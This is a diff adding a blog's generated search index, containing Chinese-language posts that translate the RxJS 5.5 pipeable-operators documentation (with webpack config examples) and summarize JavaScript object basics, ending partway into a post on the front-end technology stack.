@@ -1,0 +1,1416 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+    
+    <entry>
+      <title><![CDATA[【译】RxJS Pipeable Operators - Pipe]]></title>
+      <url>https://lostlover.github.io/20180411/RxJS%20Pipeable%20Operators%20-%20Pipe.html</url>
+      <content type="html"><![CDATA[<h1 id="Pipeable-Operators"><a href="#Pipeable-Operators" class="headerlink" title="Pipeable Operators"></a>Pipeable Operators</h1><p>从版本5.5开始，我们发布了”pipe operators”，可以直接在<code>rxjs/operators</code>访问操作符。 与<code>rxjs/ add/operator/*</code>中的操作符相比，这仅仅是一种更好的方法来引入所需的操作符。</p>
+<p><strong>注意</strong>：通过<code>rxjs/operators</code>引入的操作符，如果你的构建程序不更改配置的话，最后打包的文件会变大，不过没关系，<strong>Known Issues</strong>部分会给出解决办法。</p>
+<p><strong>改名的操作符</strong></p>
+<p>由于操作符可独立于Observable对象使用，操作符不能与JavaScript关键字冲突。 因此对某些操作符的可移植版本的名称进行更改。 有以下操作符：</p>
+<ol>
+<li><code>do</code> -&gt; <code>tap</code></li>
+<li><code>catch</code> -&gt; <code>catchError</code></li>
+<li><code>switch</code> -&gt; <code>switchAll</code></li>
+<li><code>finally</code> -&gt; <code>finalize</code></li>
+</ol>
+<a id="more"></a>
+<p><code>let</code>操作符现在是<code>Observable</code>的一部分，并且不能被导入。<br><code>source$.let(myOperator) -&gt; source$.pipe(myOperator)</code></p>
+<p>现在移除了<code>toPromise()</code>操作符，因为它返回的是<code>Observable</code>而并不是<code>Promise</code>。现在使用<code>Observable.toPromise()</code>实例方法。</p>
+<p>因为<code>throw</code>是关键字，用<code>_throw</code>来导入。<code>import { _throw } from &#39;rxjs/observable/throw&#39;</code></p>
+<p>如果<code>_</code>这个符号很困扰你，可以使用以下方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import &#123; ErrorObservable &#125; from &apos;rxjs/observable/ErrorObservable&apos;;</span><br><span class="line">...</span><br><span class="line">const e = ErrorObservable.create(new Error(&apos;My bad&apos;));</span><br><span class="line">const e2 = new ErrorObservable(new Error(&apos;My bad too&apos;));</span><br></pre></td></tr></table></figure></p>
+<h1 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h1><p><code>patched</code>操作符链式调用的问题：</p>
+<ol>
+<li><p>任何导入<code>patched</code>操作符的库都会为该库的所有使用者增加<code>Observable.prototype</code>，从而创建盲目的依赖关系。 如果删除这类库，这可能会不知不觉地影响其他人的引用。 使用<code>pipeables</code>，你必须将你需要的操作符导入到正在使用它们的每个文件中。</p>
+</li>
+<li><p>直接添加到原型上的操作符不会像<code>rollup</code>或<code>webpack</code>这样的工具“进行摇树优化”。 <code>pipeable</code>操作符将会像它们直接从模块中引入的功能一样。</p>
+</li>
+<li><p>无法通过任何构建工具或<code>lint rule</code>可靠地检测到正在应用中导入但并未使用的操作符。 这意味着你可能会导入<code>scan</code>，但不再使用它，它仍然被添加到你的输出包中。 对于<code>pipeable</code>操作符，如果你不使用它，<code>lint rule</code>可以为你检测出来。</p>
+</li>
+<li><p>这种设计很棒。 构建自己的自定义操作符变得非常容易，现在它们的工作方式与rxjs中的所有其他操作符一样。 你不需要扩展<code>Observable</code>或重写<code>lift</code>。</p>
+</li>
+</ol>
+<h1 id="What"><a href="#What" class="headerlink" title="What?"></a>What?</h1><p>什么是<code>pipeable</code>操作符？ 简而言之，可以与当前<code>let</code>运算符一起使用的函数。 它曾经是名称的起源（“lettable”），但是这让人觉得很奇怪，所以改为“pipeable”，因为它们打算与<code>pipe</code>功能一起使用。 一个<code>pipeable</code>操作符基本上是任何返回一个带有签名函数的函数：<code>&lt;T，R&gt;（source：Observable &lt;T&gt;）=&gt; Observable &lt;R&gt;</code>。</p>
+<p>现在在<code>Observable.prototype.pipe</code>中有一个’Observable<code>内置的</code>pipe`方法，它类似于以前的链式组合操作符。（如下所示）</p>
+<p>在<code>rxjs / util / pipe</code>上还有<code>pipe</code>实用功能，可用于从其他<code>pipeable</code>操作符构建可重复使用的<code>pipeable</code>操作符。</p>
+<h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>你可以在<code>rxjs / operators</code>（<strong>复数</strong>）下导入所需的操作符。 还推荐直接使用Observable创建方法，如下所示，使用`range’：</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; range &#125; <span class="keyword">from</span> <span class="string">'rxjs/observable/range'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; map, filter, scan &#125; <span class="keyword">from</span> <span class="string">'rxjs/operators'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source$ = range(<span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">source$.pipe(</span><br><span class="line">  filter(<span class="function"><span class="params">x</span> =&gt;</span> x % <span class="number">2</span> === <span class="number">0</span>),</span><br><span class="line">  map(<span class="function"><span class="params">x</span> =&gt;</span> x + x),</span><br><span class="line">  scan(<span class="function">(<span class="params">acc, x</span>) =&gt;</span> acc + x, <span class="number">0</span>)</span><br><span class="line">)</span><br><span class="line">.subscribe(<span class="function"><span class="params">x</span> =&gt;</span> <span class="built_in">console</span>.log(x))</span><br></pre></td></tr></table></figure>
+<h1 id="Build-Your-Own-Operators-Easily"><a href="#Build-Your-Own-Operators-Easily" class="headerlink" title="Build Your Own Operators Easily"></a>Build Your Own Operators Easily</h1><p>实际上，你可以用<code>let</code>来做到这一点……但是构建你自己的操作符就像现在写一个函数一样简单。 请注意，可以无缝地与其他rxjs操作符组成自定义操作符。</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; interval &#125; <span class="keyword">from</span> <span class="string">'rxjs/observable/interval'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; filter, map, take, toArray &#125; <span class="keyword">from</span> <span class="string">'rxjs/operators'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * an operator that takes every Nth value</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> takeEveryNth = <span class="function">(<span class="params">n: <span class="built_in">number</span></span>) =&gt;</span> &lt;T&gt;<span class="function">(<span class="params">source: Observable&lt;T&gt;</span>) =&gt;</span></span><br><span class="line">  <span class="keyword">new</span> Observable&lt;T&gt;(<span class="function"><span class="params">observer</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> source.subscribe(&#123;</span><br><span class="line">      next(x) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count++ % n === <span class="number">0</span>) observer.next(x);</span><br><span class="line">      &#125;,</span><br><span class="line">      error(err) &#123; observer.error(err); &#125;,</span><br><span class="line">      complete() &#123; observer.complete(); &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * You can also use an existing operator like so</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> takeEveryNthSimple = <span class="function">(<span class="params">n: <span class="built_in">number</span></span>) =&gt;</span> &lt;T&gt;<span class="function">(<span class="params">source: Observable&lt;T&gt;</span>) =&gt;</span></span><br><span class="line">  source.pipe(filter(<span class="function">(<span class="params">value, index</span>) =&gt;</span> index % n === <span class="number">0</span> ))</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * And since pipeable operators return functions, you can further simplify like so</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> takeEveryNthSimplest = <span class="function">(<span class="params">n: <span class="built_in">number</span></span>) =&gt;</span> filter(<span class="function">(<span class="params">value, index</span>) =&gt;</span> index % n === <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">interval(<span class="number">1000</span>).pipe(</span><br><span class="line">  takeEveryNth(<span class="number">2</span>),</span><br><span class="line">  map(<span class="function"><span class="params">x</span> =&gt;</span> x + x),</span><br><span class="line">  takeEveryNthSimple(<span class="number">3</span>),</span><br><span class="line">  map(<span class="function"><span class="params">x</span> =&gt;</span> x * x),</span><br><span class="line">  takeEveryNthSimplest(<span class="number">4</span>),</span><br><span class="line">  take(<span class="number">3</span>),</span><br><span class="line">  toArray()</span><br><span class="line">)</span><br><span class="line">.subscribe(<span class="function"><span class="params">x</span> =&gt;</span> <span class="built_in">console</span>.log(x));</span><br><span class="line"><span class="comment">// [0, 2304, 9216]</span></span><br></pre></td></tr></table></figure>
+<h1 id="Known-Issues"><a href="#Known-Issues" class="headerlink" title="Known Issues"></a>Known Issues</h1><h2 id="TypeScript-lt-2-4"><a href="#TypeScript-lt-2-4" class="headerlink" title="TypeScript &lt; 2.4"></a>TypeScript &lt; 2.4</h2><p>在TypeScript 2.3及更低版本中，需要将类型添加到传递给操作符的函数中，因为类型不能在TypeScript 2.4之前推断出来。 在TypeScript 2.4中，类型将通过合成来正确推断。</p>
+<p><strong>TS 2.3及以下</strong></p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">range(<span class="number">0</span>, <span class="number">10</span>).pipe(</span><br><span class="line">  map(<span class="function">(<span class="params">n: <span class="built_in">number</span></span>) =&gt;</span> n + <span class="string">'!'</span>),</span><br><span class="line">  map(<span class="function">(<span class="params">s: <span class="built_in">string</span></span>) =&gt;</span> <span class="string">'Hello, '</span> + s),</span><br><span class="line">).subscribe(<span class="function"><span class="params">x</span> =&gt;</span> <span class="built_in">console</span>.log(x))</span><br></pre></td></tr></table></figure>
+<p><strong>TS 2.4及以上</strong></p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">range(<span class="number">0</span>, <span class="number">10</span>).pipe(</span><br><span class="line">  map(<span class="function"><span class="params">n</span> =&gt;</span> n + <span class="string">'!'</span>),</span><br><span class="line">  map(<span class="function"><span class="params">s</span> =&gt;</span> <span class="string">'Hello, '</span> + s),</span><br><span class="line">).subscribe(<span class="function"><span class="params">x</span> =&gt;</span> <span class="built_in">console</span>.log(x))</span><br></pre></td></tr></table></figure>
+<h2 id="Build-and-Treeshaking"><a href="#Build-and-Treeshaking" class="headerlink" title="Build and Treeshaking"></a>Build and Treeshaking</h2><p>从<code>main</code>（或重新导出）文件导入时，应用程序包有时可能会增长。 现在从<code>rxjs / operators</code>中导入可管理的操作符，但是如果不更改构建过程，通常会导致更大的应用程序包。 这是因为默认<code>rxjs / operators</code>会解析为rxjs的CommonJS输出。</p>
+<p>为了使用新的<code>pipeable</code>操作符而不增加打包的体积，需要更改Webpack配置。 这种方法只适用于Webpack 3+，因为它依赖于来自Webpack 3新的特性<code>ModuleConcatenationPlugin</code>。</p>
+<p><strong>path-mapping</strong></p>
+<p>与rxjs 5.5一起发布的版本是使用ES5和ES2015语言级别的ECMAScript模块格式（导入和导出）的rxjs版本。 你可以在<code>node_modules/rxjs/_esm5</code>和<code>node_modules/rxjs/_esm2015</code>（“esm”代表ECMAScript模块，数字“5”或“2015”代表ES语言级别）中找到这些分布。 在你的代码中，应该从<code>rxjs / operators</code>中导入，但在Webpack配置文件中，需要将导入重新映射到ESM5（或ESM2015）版本。</p>
+<p>如果你需要使用（’rxjs / _esm5 / path-mapping’）`，将收到一个函数，该函数返回一个键值对的对象，将每个输入映射到磁盘上的文件位置。 如下：</p>
+<p><strong>webpack.config.js</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rxPaths = <span class="built_in">require</span>(<span class="string">'rxjs/_esm5/path-mapping'</span>);</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  entry: <span class="string">'index.js'</span>,</span><br><span class="line">  output: <span class="string">'bundle.js'</span>,</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    <span class="comment">// Use the "alias" key to resolve to an ESM distribution</span></span><br><span class="line">    alias: rxPaths()</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> webpack.optimize.ModuleConcatenationPlugin()</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>or</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>);</span><br><span class="line"><span class="keyword">const</span> DashboardPlugin = <span class="built_in">require</span>(<span class="string">'webpack-dashboard/plugin'</span>);</span><br><span class="line"><span class="keyword">const</span> nodeEnv = process.env.NODE_ENV || <span class="string">'development'</span>;</span><br><span class="line"><span class="keyword">const</span> isProd = nodeEnv === <span class="string">'production'</span>;</span><br><span class="line"><span class="keyword">const</span> rxPaths = <span class="built_in">require</span>(<span class="string">'rxjs/_esm5/path-mapping'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">    devtool: isProd ? <span class="string">'hidden-source-map'</span> : <span class="string">'cheap-eval-source-map'</span>,</span><br><span class="line">    context: path.resolve(<span class="string">'./src'</span>),</span><br><span class="line">    entry: &#123;</span><br><span class="line">        app: <span class="string">'./index.ts'</span>,</span><br><span class="line">        vendor: <span class="string">'./vendor.ts'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.resolve(<span class="string">'./dist'</span>),</span><br><span class="line">        filename: <span class="string">'[name].bundle.js'</span>,</span><br><span class="line">        sourceMapFilename: <span class="string">'[name].map'</span>,</span><br><span class="line">        devtoolModuleFilenameTemplate: <span class="function"><span class="keyword">function</span> (<span class="params">info</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"file:///"</span> + info.absoluteResourcePath;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">            &#123; <span class="attr">enforce</span>: <span class="string">'pre'</span>, <span class="attr">test</span>: <span class="regexp">/\.ts$|\.tsx$/</span>, <span class="attr">exclude</span>: [<span class="string">"node_modules"</span>], <span class="attr">loader</span>: <span class="string">'ts-loader'</span> &#125;,</span><br><span class="line">            &#123; <span class="attr">test</span>: <span class="regexp">/\.html$/</span>, <span class="attr">loader</span>: <span class="string">"html"</span> &#125;,</span><br><span class="line">            &#123; <span class="attr">test</span>: <span class="regexp">/\.css$/</span>, <span class="attr">loaders</span>: [<span class="string">'style'</span>, <span class="string">'css'</span>] &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    resolve: &#123;</span><br><span class="line">        extensions: [<span class="string">".ts"</span>, <span class="string">".js"</span>],</span><br><span class="line">        modules: [path.resolve(<span class="string">'./src'</span>), <span class="string">'node_modules'</span>],</span><br><span class="line">        alias: rxPaths()</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="keyword">new</span> webpack.DefinePlugin(&#123;</span><br><span class="line">            <span class="string">'process.env'</span>: &#123; <span class="comment">// eslint-disable-line quote-props</span></span><br><span class="line">                NODE_ENV: <span class="built_in">JSON</span>.stringify(nodeEnv)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="keyword">new</span> webpack.HashedModuleIdsPlugin(),</span><br><span class="line">        <span class="keyword">new</span> webpack.optimize.ModuleConcatenationPlugin(),</span><br><span class="line">        <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">            title: <span class="string">'Typescript Webpack Starter'</span>,</span><br><span class="line">            template: <span class="string">'!!ejs-loader!src/index.html'</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="keyword">new</span> webpack.optimize.CommonsChunkPlugin(&#123;</span><br><span class="line">            name: <span class="string">'vendor'</span>,</span><br><span class="line">            minChunks: <span class="literal">Infinity</span>,</span><br><span class="line">            filename: <span class="string">'vendor.bundle.js'</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="keyword">new</span> webpack.optimize.UglifyJsPlugin(&#123;</span><br><span class="line">            mangle: <span class="literal">false</span>,</span><br><span class="line">            compress: &#123; <span class="attr">warnings</span>: <span class="literal">false</span>, <span class="attr">pure_getters</span>: <span class="literal">true</span>, <span class="attr">passes</span>: <span class="number">3</span>, <span class="attr">screw_ie8</span>: <span class="literal">true</span>, <span class="attr">sequences</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">            output: &#123; <span class="attr">comments</span>: <span class="literal">false</span>, <span class="attr">beautify</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">            sourceMap: <span class="literal">false</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="keyword">new</span> DashboardPlugin(),</span><br><span class="line">        <span class="keyword">new</span> webpack.LoaderOptionsPlugin(&#123;</span><br><span class="line">            options: &#123;</span><br><span class="line">                tslint: &#123;</span><br><span class="line">                    emitErrors: <span class="literal">true</span>,</span><br><span class="line">                    failOnHint: <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = config;</span><br></pre></td></tr></table></figure>
+<p><strong>无法控制构建过程时</strong></p>
+<p>如果无法控制构建过程（或者无法升级到Webpack 3+），则上述解决方案将无法工作。 因此，从<code>rxjs / operators</code>导入可能会使你的应用程序包变大。 但是，仍然有一种方法可以使用<code>pipeable</code>操作符。 你必须使用深导入，这与你在5.5版之前导入的方式和<code>pipeable</code>操作符相似：</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; map, filter, reduce &#125; <span class="keyword">from</span> <span class="string">'rxjs/operators'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 变为:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; map &#125; <span class="keyword">from</span> <span class="string">'rxjs/operators/map'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; filter &#125; <span class="keyword">from</span> <span class="string">'rxjs/operators/filter'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; reduce &#125; <span class="keyword">from</span> <span class="string">'rxjs/operators/reduce'</span>;</span><br></pre></td></tr></table></figure>]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Javascript总结]]></title>
+      <url>https://lostlover.github.io/20161011/javascript-started.html</url>
+      <content type="html"><![CDATA[<h1 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h1><h2 id="对象使用和属性"><a href="#对象使用和属性" class="headerlink" title="对象使用和属性"></a>对象使用和属性</h2><p>JavaScript 中所有变量都可以当作对象使用，除了两个例外 <code>null</code> 和 <code>undefined</code>。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">false</span>.toString(); <span class="comment">// 'false'</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].toString(); <span class="comment">// '1,2,3'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">Foo.bar = <span class="number">1</span>;</span><br><span class="line">Foo.bar; <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
+<p>一个常见的误解是数字的字面值（literal）不能当作对象使用。这是因为 JavaScript 解析器的一个错误， 它试图将点操作符解析为浮点数字面值的一部分。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>toString(); <span class="comment">// 出错：SyntaxError</span></span><br></pre></td></tr></table></figure>
+<p>有很多变通方法可以让数字的字面值看起来像对象。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>.toString(); <span class="comment">// 第二个点号可以正常解析</span></span><br><span class="line"><span class="number">2</span> .toString(); <span class="comment">// 注意点号前面的空格</span></span><br><span class="line">(<span class="number">2</span>).toString(); <span class="comment">// 2先被计算</span></span><br></pre></td></tr></table></figure>
+<h2 id="对象作为数据类型"><a href="#对象作为数据类型" class="headerlink" title="对象作为数据类型"></a>对象作为数据类型</h2><p>JavaScript 的对象可以作为哈希表使用，主要用来保存命名的键与值的对应关系。</p>
+<p>使用对象的字面语法 - {} - 可以创建一个简单对象。这个新创建的对象从 Object.prototype 继承下面，没有任何自定义属性。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = &#123;&#125;; <span class="comment">// 一个空对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个新对象，拥有一个值为12的自定义属性'test'</span></span><br><span class="line"><span class="keyword">var</span> bar = &#123;<span class="attr">test</span>: <span class="number">12</span>&#125;;</span><br></pre></td></tr></table></figure>
+<h2 id="访问属性"><a href="#访问属性" class="headerlink" title="访问属性"></a>访问属性</h2><p>有两种方式来访问对象的属性，点操作符或者中括号操作符。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = &#123;<span class="attr">name</span>: <span class="string">'kitten'</span>&#125;</span><br><span class="line">foo.name; <span class="comment">// kitten</span></span><br><span class="line">foo[<span class="string">'name'</span>]; <span class="comment">// kitten</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> get = <span class="string">'name'</span>;</span><br><span class="line">foo[get]; <span class="comment">// kitten</span></span><br><span class="line"></span><br><span class="line">foo<span class="number">.1234</span>; <span class="comment">// SyntaxError</span></span><br><span class="line">foo[<span class="string">'1234'</span>]; <span class="comment">// works</span></span><br></pre></td></tr></table></figure>
+<p>两种语法是等价的，但是中括号操作符在下面两种情况下依然有效</p>
+<ul>
+<li>动态设置属性</li>
+<li>属性名不是一个有效的变量名（译者注：比如属性名中包含空格，或者属性名是 JS 的关键词）</li>
+</ul>
+<h2 id="删除属性"><a href="#删除属性" class="headerlink" title="删除属性"></a>删除属性</h2><p>删除属性的唯一方法是使用 <code>delete</code> 操作符；设置属性为 <code>undefined</code> 或者 <code>null</code> 并不能真正的删除属性， 而仅仅是移除了属性和值的关联。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    bar: <span class="number">1</span>,</span><br><span class="line">    foo: <span class="number">2</span>,</span><br><span class="line">    baz: <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line">obj.bar = <span class="literal">undefined</span>;</span><br><span class="line">obj.foo = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">delete</span> obj.baz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj.hasOwnProperty(i)) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i, <span class="string">''</span> + obj[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面的输出结果有 <code>bar undefined</code> 和 <code>foo null</code> - 只有 <code>baz</code> 被真正的删除了，所以从输出结果中消失。</p>
+<h2 id="属性名的语法"><a href="#属性名的语法" class="headerlink" title="属性名的语法"></a>属性名的语法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line">    <span class="string">'case'</span>: <span class="string">'I am a keyword so I must be notated as a string'</span>,</span><br><span class="line">    <span class="keyword">delete</span>: <span class="string">'I am a keyword too so me'</span> <span class="comment">// 出错：SyntaxError</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>对象的属性名可以使用字符串或者普通字符声明。但是由于 JavaScript 解析器的另一个错误设计， 上面的第二种声明方式在 ECMAScript 5 之前会抛出 <code>SyntaxError</code> 的错误。</p>
+<p>这个错误的原因是 delete 是 JavaScript 语言的一个关键词；因此为了在更低版本的 JavaScript 引擎下也能正常运行， 必须使用字符串字面值声明方式。</p>
+<a id="more"></a>
+<h1 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h1>]]></content>
+      
+        <categories>
+            
+            <category> javascript </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> javascript </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[前端技术栈]]></title>
+      <url>https://lostlover.github.io/20161006/front-end-system-strack.html</url>
+      <content type="html"><![CDATA[<blockquote>
+<p>浏览器环境</p>
+</blockquote>
